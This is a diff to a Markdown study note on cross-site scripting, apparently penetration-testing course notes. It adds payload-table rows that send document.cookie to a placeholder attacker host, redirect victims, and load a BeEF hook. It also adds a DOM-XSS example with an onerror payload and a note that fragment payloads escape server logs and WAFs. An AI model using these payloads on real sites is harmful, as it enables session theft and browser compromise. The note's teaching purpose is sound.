@@ -16,6 +16,9 @@ tags:
 > | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
 > | Attribute inject | `" onmouseover="alert(1)` |
 > | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |
+> | Cookie steal (fetch) | `<script>fetch('http://<LHOST>/?c='+document.cookie)</script>` |
+> | Redirect victim | `<script>window.location='http://<LHOST>'</script>` |
+> | BeEF hook | `<script src="http://<LHOST>:3000/hook.js"></script>` |
 
 ## Decision Tree
 
@@ -89,6 +92,20 @@ Either of these two vulnerability variants can manifest as client- (browser) or 
 DOM-based XSS takes place solely within the page's Document Object Model (DOM). While we won't cover too much detail for now, we should know that browsers parse a page's HTML content and then generate an internal DOM representation. This type of XSS occurs when a page's DOM is modified with user-controlled values. DOM-based XSS can be stored or reflected; the key distinction is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.
 
 No matter how the XSS payload is delivered and executed, the injected scripts run under the context of the user visiting the affected page. This means that the user's browser, not the web application, executes the XSS payload. These attacks can be nevertheless significant, with impacts including session hijacking, forced redirection to malicious pages, execution of local applications as that user, or even trojanized web applications. In the following sections, we will explore some of these attacks.
+
+> [!example] A minimal DOM-based XSS
+> A page whose client-side JS writes part of the URL straight into the DOM, with no server round-trip:
+> ```javascript
+> // vulnerable client-side sink somewhere in the page's JS
+> document.write(location.hash.substring(1));
+> ```
+> ```
+> http://target/page.html#<img src=x onerror=alert(1)>
+> ```
+> Loading that URL pops the alert entirely client-side.
+
+> [!warning] DOM XSS via `location.hash` won't show up server-side
+> Everything after `#` in a URL (the fragment) is never sent to the server — it never appears in access logs, and a server-side WAF or input filter never sees it. If a payload triggers in the browser but a Burp/proxy replay of the same request doesn't reproduce it, check whether the sink is reading `location.hash`, `location.search`, or another client-only source instead of a server-reflected parameter.
 
 ---
 %% graph-links %%
